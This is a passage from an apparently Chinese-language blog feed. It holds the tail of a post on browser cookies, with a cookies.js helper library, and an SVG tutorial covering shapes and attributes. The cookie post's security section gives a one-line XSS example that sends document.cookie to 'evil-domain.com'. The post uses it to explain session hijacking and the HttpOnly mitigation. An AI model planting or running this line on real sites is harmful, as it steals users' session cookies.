class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*\</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  :: cookies.js ::</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  A complete cookies reader/writer framework with full unicode support.</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  This framework is released under the GNU Public License, version 3 or later.</span></span><br><span class="line"><span class="comment">|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  Syntaxes:</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])</span></span><br><span class="line"><span class="comment">|*|  * docCookies.getItem(name)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.removeItem(name[, path], domain)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.hasItem(name)</span></span><br><span class="line"><span class="comment">|*|  * docCookies.keys()</span></span><br><span class="line"><span class="comment">|*|</span></span><br><span class="line"><span class="comment">\*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// document.cookie.replace(/(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/, "$1");</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> docCookies = &#123;</span><br><span class="line">  getItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:(?:^|.*;)\\s*"</span> + <span class="built_in">encodeURIComponent</span>(sKey).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\=\\s*([^;]*).*$)|^.*$"</span>), <span class="string">"$1"</span>)) || <span class="literal">null</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  setItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey, sValue, vEnd, sPath, sDomain, bSecure</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!sKey || <span class="regexp">/^(?:expires|max\-age|path|domain|secure)$/i</span>.test(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="keyword">var</span> sExpires = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (vEnd) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (vEnd.constructor) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">Number</span>:</span><br><span class="line">          sExpires = vEnd === <span class="literal">Infinity</span> ? <span class="string">"; expires=Fri, 31 Dec 9999 23:59:59 GMT"</span> : <span class="string">"; max-age="</span> + vEnd;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">String</span>:</span><br><span class="line">          sExpires = <span class="string">"; expires="</span> + vEnd;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="built_in">Date</span>:</span><br><span class="line">          sExpires = <span class="string">"; expires="</span> + vEnd.toUTCString();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">"="</span> + <span class="built_in">encodeURIComponent</span>(sValue) + sExpires + (sDomain ? <span class="string">"; domain="</span> + sDomain : <span class="string">""</span>) + (sPath ? <span class="string">"; path="</span> + sPath : <span class="string">""</span>) + (bSecure ? <span class="string">"; secure"</span> : <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  removeItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey, sPath, sDomain</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!sKey || !<span class="keyword">this</span>.hasItem(sKey)) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    <span class="built_in">document</span>.cookie = <span class="built_in">encodeURIComponent</span>(sKey) + <span class="string">"=; expires=Thu, 01 Jan 1970 00:00:00 GMT"</span> + ( sDomain ? <span class="string">"; domain="</span> + sDomain : <span class="string">""</span>) + ( sPath ? <span class="string">"; path="</span> + sPath : <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  hasItem: <span class="function"><span class="keyword">function</span> (<span class="params">sKey</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(sKey).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie);</span><br><span class="line">  &#125;,</span><br><span class="line">  keys: <span class="comment">/* optional method: you can safely remove it! */</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> aKeys = <span class="built_in">document</span>.cookie.replace(<span class="regexp">/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g</span>, <span class="string">""</span>).split(<span class="regexp">/\s*(?:\=[^;]*)?;\s*/</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> nIdx = <span class="number">0</span>; nIdx &lt; aKeys.length; nIdx++) &#123; aKeys[nIdx] = <span class="built_in">decodeURIComponent</span>(aKeys[nIdx]); &#125;</span><br><span class="line">    <span class="keyword">return</span> aKeys;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>路径限制并不能阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的iframe, 然后访问其 contentDocument.cookie 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用同源策略保护其不被读取.</p><p>Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 -  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>HttpOnly 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击.</p><blockquote><p>参考资料：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">MDN</a>  </li><li><a href="https://github.com/js-cookie/js-cookie" target="_blank" rel="noopener">js-cookie</a>  </li><li><a href="https://www.kancloud.cn/kancloud/http-cookies-explained/48333" target="_blank" rel="noopener">HTTP cookie详解</a></li><li><a href="https://www.kancloud.cn/dennis/tgjavascript/241831" target="_blank" rel="noopener">Javascript 半知半解</a></li></ul></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;cookie 知识小记&lt;br&gt;日常工作中常常会用到cookie，本文总结了一下cookie的常用只是点，用作笔记。&lt;br&gt;
    
    </summary>
    
      <category term="Javascript" scheme="https://jiuylq.github.io/categories/Javascript/"/>
    
    
      <category term="Javascript" scheme="https://jiuylq.github.io/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>SVG 入门</title>
    <link href="https://jiuylq.github.io/2018/12/13/SVG/"/>
    <id>https://jiuylq.github.io/2018/12/13/SVG/</id>
    <published>2018-12-13T08:31:09.000Z</published>
    <updated>2019-04-07T05:15:36.115Z</updated>
    
    <content type="html"><![CDATA[<p>SVG 可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言<br><a id="more"></a></p><the rest of contents | 余下全文><h1 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h1><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言。</p><!-- more --><blockquote><p>优势：<br>　　SVG 可被非常多的工具读取和修改（比如记事本）<br>　　SVG 与 JPEG 和 GIF 图像比起来，尺寸更小，且可压缩性更强。<br>　　SVG 是可伸缩的<br>　　SVG 图像可在任何的分辨率下被高质量地打印<br>　　SVG 可在图像质量不下降的情况下被放大<br>　　SVG 图像中的文本是可选的，同时也是可搜索的（很适合制作地图）<br>　　SVG 可以与 Java 技术一起运行<br>　　SVG 是开放的标准<br>　　SVG 文件是纯粹的 XML  </p></blockquote><p><a href="https://caniuse.com/#search=svg" title="Click to see SVG compatibility" target="_blank" rel="noopener">兼容性</a></p><p><em>SVG 于 2003 年 1 月 14 日成为 W3C 推荐标准。</em></p><h2 id="二、SVG-实例"><a href="#二、SVG-实例" class="headerlink" title="二、SVG 实例"></a>二、SVG 实例</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" </span></span><br><span class="line"><span class="meta">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"100"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"40"</span> <span class="attr">stroke</span>=<span class="string">"black"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">stroke-width</span>=<span class="string">"2"</span> <span class="attr">fill</span>=<span class="string">"red"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析：<br>　　第一行包含了 XML 声明。请注意 standalone 属性！该属性规定此 SVG 文件是否是”独立的”，或含有对外部文件的引用。standalone=”no” 意味着 SVG 文档会引用一个外部文件 - 在这里，是 DTD 文件。<br>　　第二和第三行引用了这个外部的 SVG DTD。该 DTD 位于 “<a href="http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;。该" target="_blank" rel="noopener">http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;。该</a> DTD 位于 W3C，含有所有允许的 SVG 元素。<br>　　SVG 代码以<code>&lt;svg&gt;</code>元素开始，包括开启标签<code>&lt;svg&gt;</code>和关闭标签<code>&lt;/svg&gt;</code>。这是根元素。width 和 height 属性可设置此 SVG 文档的宽度和高度。version 属性可定义所使用的 SVG 版本，xmlns 属性可定义 SVG 命名空间。<br>　　stroke 和 stroke-width 属性控制如何显示形状的轮廓。fill 属性设置形状内的颜色。<br>　　<em>注释：所有的开启标签必须有关闭标签！</em></p><h2 id="三、页面中使用SVG"><a href="#三、页面中使用SVG" class="headerlink" title="三、页面中使用SVG"></a>三、页面中使用SVG</h2><ol><li>SVG可以直接嵌入到HTML页面中使用</li><li>SVG代码也可以写在一个独立文件中，然后用<code>&lt;img&gt;、&lt;object&gt;、&lt;embed&gt;、&lt;iframe&gt;</code>等标签插入网页</li><li>CSS 也可以使用 SVG 文件</li><li><p>SVG 文件还可以转为 BASE64 编码，然后作为 Data URI 写入网页。</p><p> eg:</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 直接在html中写SVG代码 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span></span></span><br><span class="line"><span class="tag"><span class="attr">id</span>=<span class="string">"mysvg"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span></span></span><br><span class="line"><span class="tag"><span class="attr">viewBox</span>=<span class="string">"0 0 800 600"</span></span></span><br><span class="line"><span class="tag"><span class="attr">preserveAspectRatio</span>=<span class="string">"xMidYMid meet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"mycircle"</span> <span class="attr">cx</span>=<span class="string">"400"</span> <span class="attr">cy</span>=<span class="string">"300"</span> <span class="attr">r</span>=<span class="string">"50"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 通过标签引入SVG --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"circle.svg"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"object"</span> <span class="attr">data</span>=<span class="string">"circle.svg"</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;object&gt;:</span></span><br><span class="line"><span class="comment">优势：所有主要浏览器都支持，并支持HTML4，XHTML和HTML5标准</span></span><br><span class="line"><span class="comment">缺点：不允许使用脚本。 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">id</span>=<span class="string">"embed"</span> <span class="attr">src</span>=<span class="string">"icon.svg"</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;embed&gt;:</span></span><br><span class="line"><span class="comment">优势：所有主要浏览器都支持，并允许使用脚本</span></span><br><span class="line"><span class="comment">缺点：不推荐在HTML4和XHTML中使用（但在HTML5允许） --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"icon.svg"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;iframe&gt;:</span></span><br><span class="line"><span class="comment">优势：所有主要浏览器都支持，并允许使用脚本</span></span><br><span class="line"><span class="comment">缺点：不推荐在HTML4和XHTML中使用（但在HTML5允许） --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- css中引入SVG --&gt;</span></span><br><span class="line">.logo &#123;</span><br><span class="line">background: url(icon.svg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 转为 BASE64 编码引入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:image/svg+xml;base64,[data]"</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="四、语法"><a href="#四、语法" class="headerlink" title="四、语法"></a>四、语法</h2><p><strong>SVG Shapes</strong><br>SVG有一些预定义的形状元素，可被开发者使用和操作：  </p><ul><li>矩形 <code>&lt;rect&gt;</code></li><li>圆形 <code>&lt;circle&gt;</code></li><li>椭圆 <code>&lt;ellipse&gt;</code></li><li>线 <code>&lt;line&gt;</code></li><li>折线 <code>&lt;polyline&gt;</code></li><li>多边形 <code>&lt;polygon&gt;</code></li><li>路径 <code>&lt;path&gt;</code></li></ul><ol><li><p><code>&lt;svg&gt;</code>标签<br> SVG 代码都放在顶层标签<code>&lt;svg&gt;</code>之中。  </p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">viewBox</span>=<span class="string">"50 50 50 50"</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- svg stuff here --&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;svg&gt;</code>的width属性和height属性，指定了 SVG 图像在 HTML 元素中所占据的宽度和高度。除了相对单位，也可以采用绝对单位（单位：像素）。如果不指定这两个属性，SVG 图像默认大小是300像素（宽） x 150像素（高）。<br>如果只想展示 SVG 图像的一部分，就要指定viewBox属性。</li><li><p><code>View box</code>——这个值允许我们指定一组图像伸展开来适应一个特定的容器元素。<code>viewBox</code>属性的值是一个包含四个数字的列表。min-x,min-y,width,height。 <code>viewBox</code>属性的四个值，分别是左上角的横坐标和纵坐标、视口的宽度和高度。下面代码中，SVG 图像是100像素宽 x 100像素高，viewBox属性指定视口从(50, 50)这个点开始。所以，实际看到的是右下角的四分之一圆。</p></li><li><p>注意，视口必须适配所在的空间。下面代码中，视口的大小是 50 x 50，由于 SVG 图像的大小是 100 x 100，所以视口会放大去适配 SVG 图像的大小，即放大了四倍。</p></li><li><p>如果不指定width属性和height属性，只指定viewBox属性，则相当于只给定 SVG 图像的长宽比。这时，SVG 图像的默认大小将等于所在的 HTML 元素的大小。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">viewBox</span>=<span class="string">"50 50 50 50"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"mycircle"</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"50"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>&lt;rect&gt;</code> 标签<br> <code>&lt;rect&gt;</code>标签用于绘制矩形。</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"120"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">"10"</span> <span class="attr">y</span>=<span class="string">"10"</span> <span class="attr">rx</span>=<span class="string">"20"</span> <span class="attr">ry</span>=<span class="string">"20"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">style</span>=<span class="string">"stroke: #70d5dd; stroke-width: 3px; fill: #dd524b; fill-opacity:0.1; stroke-opacity:0.9; opacity:0.5;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>x</code> —— 指定了矩形左上角端点的横坐标；</li><li><code>y</code> —— 指定了矩形左上角端点的纵坐标；</li><li><code>rx</code> —— 用于指定圆角x轴的弧度；</li><li><code>ry</code> —— 用于指定圆角y轴的弧度；</li><li><code>width</code> —— 属性指定了矩形的宽度（单位像素）；</li><li><code>height</code> —— 属性指定了矩形的高度（单位像素）; </li><li>CSS属性<ul><li><code>fill</code> —— CSS属性定义矩形的填充颜色（rgb 值、颜色名或者十六进制值）；</li><li><code>stroke-width</code> 属性定义矩形边框的宽度；</li><li><code>stroke</code> —— 属性定义矩形边框的颜色;</li><li><code>fill-opacity</code> —— 属性定义填充颜色透明度（合法的范围是：0 - 1）；</li><li><code>stroke-opacity</code> —— 属性定义轮廓颜色的透明度（合法的范围是：0 - 1）；</li><li><code>opacity</code> —— 属性用于定义了元素的透明值 (范围: 0 到 1)；<div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg width="300" height="180"><br/>      <rect x="10" y="10" rx="20" ry="20" height="100" width="200" style="stroke: #9AFF02; stroke-width: 3px; fill: red; fill-opacity:0.9; stroke-opacity:0.9; opacity:0.5;"/><br/>  </svg><br></div></li></ul></li></ul></li><li><p><code>&lt;circle&gt;</code>标签<br> <code>&lt;circle&gt;</code>标签用于绘制圆形</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"25"</span> <span class="attr">style</span>=<span class="string">"stroke: #9AFF02; stroke-width: 3px; fill: red;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>cx</code> —— 定义圆点的x坐标（单位为像素）；</li><li><code>cy</code> —— 定义圆点的y坐标 （单位为像素）；</li><li><code>r</code> —— 半径 （单位为像素）；<br><em>坐标都是相对于<code>&lt;svg&gt;</code>画布的左上角原点。</em><div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg width="300" height="180"><br/>      <circle cx="50" cy="50" r="25" style="stroke: #9AFF02; stroke-width: 3px; fill: red;"/><br/>  </svg><br></div></li></ul></li><li><p><code>&lt;ellipse&gt;</code>标签<br> <code>&lt;ellipse&gt;</code>标签用于绘制椭圆</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">cx</span>=<span class="string">"60"</span> <span class="attr">cy</span>=<span class="string">"60"</span> <span class="attr">ry</span>=<span class="string">"40"</span> <span class="attr">rx</span>=<span class="string">"20"</span> <span class="attr">stroke</span>=<span class="string">"#9AFF02"</span> <span class="attr">stroke-width</span>=<span class="string">"3"</span> <span class="attr">fill</span>=<span class="string">"red"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>cx</code> —— 定义椭圆中心的x坐标</li><li><code>cy</code> —— 定义椭圆中心的y坐标</li><li><code>rx</code> —— 定义椭圆的水平半径</li><li><code>ry</code> —— 定义椭圆的垂直半径<div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg width="300" height="180"><br/>      <ellipse cx="60" cy="60" ry="40" rx="20" stroke="#9AFF02" stroke-width="3" fill="red"/><br/>  </svg><br></div></li></ul></li><li><p><code>&lt;line&gt;</code>标签<br><code>&lt;line&gt;</code>标签用来绘制直线</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">line</span> <span class="attr">x1</span>=<span class="string">"10"</span> <span class="attr">y1</span>=<span class="string">"50"</span> <span class="attr">x2</span>=<span class="string">"100"</span> <span class="attr">y2</span>=<span class="string">"50"</span> <span class="attr">style</span>=<span class="string">"stroke:#9AFF02;stroke-width:3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>x1</code> —— 定义线段起点的横坐标</li><li><code>y1</code> —— 定义线段起点的纵坐标</li><li><code>x2</code> —— 定义线段终点的横坐标</li><li><code>y2</code> —— 定义线段终点的纵坐标<div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>   <svg width="300" height="180"><br/>       <line x1="10" y1="50" x2="100" y2="50" style="stroke:#9AFF02;stroke-width:3"/><br/>   </svg><br></div></li></ul></li><li><p><code>&lt;polyline&gt;</code>标签<br> <code>&lt;polyline&gt;</code>标签用于绘制一根折线</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">polyline</span> <span class="attr">points</span>=<span class="string">"20,20 60,40 80,90 150,50 200,130"</span> <span class="attr">style</span>=<span class="string">"fill:none;stroke:#9AFF02;stroke-width:3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>points</code> —— 属性指定了每个端点的坐标x、y，x坐标与y坐标之间与逗号分隔，点与点之间用空格分隔。<div style="width: 300px; height: 150px; margin: 15px 0; border: 1px solid #ff0000;"><br>  <svg xmlns="http://www.w3.org/2000/svg" version="1.1"><br/>      <polyline points="20,20 60,40 80,90 150,50 200,130" style="fill:none;stroke:#9AFF02;stroke-width:3"/><br/>  </svg><br></div></li></ul></li><li><p><code>&lt;polygon&gt;</code>标签<br> <code>&lt;polygon&gt;</code>标签用于绘制多边形</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">polygon</span> <span class="attr">fill</span>=<span class="string">"green"</span> <span class="attr">stroke</span>=<span class="string">"orange"</span> <span class="attr">stroke-width</span>=<span class="string">"1"</span> <span class="attr">points</span>=<span class="string">"0,0 100,0 100,100 0,100 0,0"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 